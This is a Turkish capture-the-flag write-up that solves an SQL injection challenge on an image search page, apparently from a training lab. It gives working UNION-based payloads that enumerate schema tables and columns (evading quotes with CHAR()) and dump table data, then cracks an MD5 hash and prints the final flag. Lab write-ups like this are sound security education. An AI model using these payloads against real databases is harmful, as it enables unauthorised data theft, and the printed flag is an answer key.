# SQL Injection - Image Search

## 1. Tablo İsmini Bulma

```sql
1 AND 1=0 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()--
```

**Sonuç:** `list_images`

---

## 2. Kolon İsimlerini Bulma

```sql
1 AND 1=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(108,105,115,116,95,105,109,97,103,101,115)--
```

### Bulunan Kolonlar:
- `id`
- `url`
- `title`
- `comment`

**Çıktı:**
```
ID: 1 AND 1=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(108,105,115,116,95,105,109,97,103,101,115)-- 
Title: 
Url : id

ID: 1 AND 1=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(108,105,115,116,95,105,109,97,103,101,115)-- 
Title: 
Url : url

ID: 1 AND 1=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(108,105,115,116,95,105,109,97,103,101,115)-- 
Title: 
Url : title

ID: 1 AND 1=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(108,105,115,116,95,105,109,97,103,101,115)-- 
Title: 
Url : comment
```

---

## 3. Verileri Çekme

```sql
1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images
```

### Önemli Kayıt:

```
ID: 1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM list_images 
Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 1
```

---

## 4. Flag Bulma

### MD5 Hash Decode:
- **Hash:** `1928e8083cf461a51303633093573c46`
- **Tool:** [CrackStation](https://crackstation.net/)
- **Decoded:** `albatroz`

### SHA256 Encode:
```bash
echo -n "albatroz" | sha256sum
```

**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

---

## Özet

1. SQL Injection ile `list_images` tablosunu bulduk
2. CHAR() fonksiyonu kullanarak kolon isimlerini öğrendik
3. CONCAT() ile tüm verileri birleştirip çektik
4. `comment` kolonunda gizli MD5 hash bulduk
5. MD5'i decode edip SHA256 ile hash'leyerek flag'i elde ettik

**Flag:** `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`